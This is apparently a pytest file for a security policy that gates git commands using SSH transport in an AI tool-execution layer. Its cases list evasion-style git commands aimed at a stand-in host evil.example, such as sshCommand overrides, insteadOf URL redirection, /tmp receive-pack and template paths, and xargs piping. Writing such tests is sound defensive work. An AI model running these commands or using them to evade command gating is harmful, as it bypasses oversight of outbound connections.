import pytest
from core.inference.ssh_policy import check_ssh_command_access
from core.inference.tools import _check_code_safety
from state.ssh_approvals import approve_hosts,reset_ssh_approvals

@pytest.mark.parametrize('command',[
 "git -c core.sshCommand='ssh -F none' ls-remote ssh://evil.example/repo",
 "git clone deploy@evil.example:repo",
 "git clone --template /tmp ssh://evil.example/repo",
 "git push --receive-pack /tmp/receiver evil.example:repo main",
 "git fetch origin",
 "git pull",
 "git -C repo push origin main",
 "git remote update",
 "git submodule update --init",
 "git archive --remote=ssh://evil.example/repo HEAD",
 "git --config-env=core.sshCommand=SSH ls-remote ssh://evil.example/repo",
 "git -c url.ssh://evil.example/.insteadOf=https://safe.example/ clone https://safe.example/repo",
 "env git ls-remote ssh://evil.example/repo",
 "printf '%s' ssh://evil.example/repo | xargs git ls-remote",
])
def test_git_ssh_requires_explicit_destination(command):
 reset_ssh_approvals()
 assert check_ssh_command_access(command,'round20') is not None
 approve_hosts('round20',['evil.example'])
 assert check_ssh_command_access(command,'round20') is not None

@pytest.mark.parametrize('command',[
 'git status', 'git --version', 'git', 'git push https://example.com/repo main:main', 'git log --grep=ssh://evil.example/repo',
 'git remote add origin ssh://evil.example/repo', 'git archive HEAD',
 'git clone https://github.com/example/project', 'git clone ./local-repo',
])
def test_git_without_ssh_transport_is_unchanged(command):
 assert check_ssh_command_access(command,'round20') is None

def test_python_git_launcher_is_gated():
 assert _check_code_safety("import subprocess; subprocess.run(['git','ls-remote','ssh://evil.example/repo'])",session_id='round20') is not None
